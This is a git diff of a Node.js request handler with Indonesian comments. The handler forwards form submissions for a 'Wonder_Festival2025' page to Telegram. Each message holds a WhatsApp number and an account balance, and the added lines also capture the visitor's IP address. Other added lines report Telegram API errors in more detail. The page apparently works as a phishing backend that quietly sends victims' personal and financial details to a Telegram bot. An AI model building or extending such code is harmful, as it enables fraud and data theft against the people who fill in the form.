@@ -36,7 +36,14 @@ module.exports = async (req, res) => {
       return res.status(500).json({ success: false, message: 'Server configuration error' });
     }
 
-    // Format pesan untuk Telegram - gunakan format saldo asli dari form
+    // Dapatkan IP address pengguna
+    const userIP = req.headers['x-forwarded-for'] || 
+                   req.headers['x-real-ip'] || 
+                   req.connection.remoteAddress || 
+                   req.socket.remoteAddress ||
+                   (req.connection.socket ? req.connection.socket.remoteAddress : null);
+
+    // Format pesan untuk Telegram dengan informasi IP
     const telegramMessage = `
 𝗪𝗼𝗻𝗱𝗲𝗿_𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹𝟮𝟬𝟮𝟱
 ────────────────────
@@ -44,6 +51,7 @@ module.exports = async (req, res) => {
 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 | ${phone}
 𝗦𝗮𝗹𝗱𝗼 | ${balance}
 ────────────────────
+𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP || 'Tidak terdeteksi'}
     `;
 
     // Kirim ke Telegram
@@ -57,6 +65,17 @@ module.exports = async (req, res) => {
 
   } catch (error) {
     console.error('Error:', error.message);
-    res.status(500).json({ success: false, message: 'Terjadi kesalahan server' });
+    
+    // Berikan pesan error yang lebih spesifik
+    let errorMessage = 'Terjadi kesalahan server';
+    if (error.response) {
+      // Error dari Telegram API
+      errorMessage = `Error Telegram: ${error.response.data.description || error.response.status}`;
+    } else if (error.request) {
+      // Tidak ada response dari Telegram
+      errorMessage = 'Tidak dapat terhubung ke Telegram API';
+    }
+    
+    res.status(500).json({ success: false, message: errorMessage });
   }
 };
